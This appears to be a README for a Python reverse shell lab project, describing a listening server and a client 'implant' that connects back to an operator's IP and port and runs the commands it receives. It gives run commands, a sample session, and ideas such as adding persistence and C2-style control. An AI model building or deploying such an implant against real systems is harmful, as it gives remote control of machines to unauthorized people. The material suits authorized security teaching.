
# 🐚 Python Reverse Shell (Server + Client)

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue.svg">
  <img src="https://img.shields.io/badge/License-MIT-green.svg">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red.svg">
</p>

This project demonstrates a **basic reverse shell** implementation in Python for controlled lab use.  
It consists of two components:

- **Server (`server.py`)** → The attacker/handler that waits for connections and sends commands.
    
- **Client (`client.py`)** → The implant that connects back to the server and executes received commands.
    

⚠️ **Disclaimer**: This project is for **educational and authorized penetration testing purposes only**. Do not deploy it on systems you do not own or have explicit permission to test.

## ## 🚀 **Features**

- TCP socket communication between server and client.
    
- JSON-based encoding/decoding for safe data transfer.
    
- Command execution on the client side (including `cd` handling).
    
- Error handling for failed connections and invalid commands.
    
- Skips empty input (server does not send blank commands).
    
- Graceful exit with the `exit` command.

## ## 🧩 **Programming Logic**

### 1. Server (`server.py`)

1. **Setup Listener**
    
    - Creates a TCP socket bound to the given IP and port.
        
    - Waits for a client connection.
        
2. **Send & Receive**
    
    - Commands from the operator are serialized with `json.dumps` and sent to the client.
        
    - Responses from the client are received, reassembled, and deserialized with `json.loads`.
        
3. **Command Loop**
    
    - Prompts operator with `Shell#:` .
        
    - If the input is empty → skip sending.
        
    - If `exit` is entered → close session.
        
    - Otherwise → send command, wait for client response, print it.
        

---

### 2. Client (`client.py`)

1. **Connect to Server**
    
    - Creates a TCP socket and connects back to the operator’s IP/port.
        
2. **Receive & Execute**
    
    - Waits for JSON-encoded commands from the server.
        
    - Handles special case:
        
        - If `exit` → close connection.
            
        - If `cd <dir>` → change working directory using `os.chdir()`.
            
    - Otherwise executes commands with `os.popen()` and captures output.
        
3. **Send Response**
    
    - Always sends a JSON response back to the server (command output, error, or directory change confirmation).

## ## 📜 **Usage**

### 1. Start the Server

```python
python3 server.py <IP> <PORT>
```

```python
python3 server.py 192.168.1.23 1234
```

### 2. Start the Client

Edit the `server('IP', PORT)` line in **client.py** with your server’s IP and port:

```python
server('192.168.1.3', 1234)`
```

Then run :

```python
python3 client.py
```

### 3. Interact

- From the server console :

```bash

Shell#: ls
client.py
requirements.txt
server.py

Shell#: pwd
/home/kali/Desktop/Reverse Shell and Backdoor

Shell#: cd ..
Changed directory to: /home/kali/Desktop

Shell#: exit
```

## 🔮 Possible Improvements

- Handle large command outputs with streaming/chunking.
    
- Add command history and better shell prompt on the server side.
    
- Implement encryption (TLS or symmetric encryption) instead of plain-text sockets.
    
- Add persistence or multi-client management (C2-style).
    
- Replace `os.popen()` with `subprocess.Popen` for more robust execution.
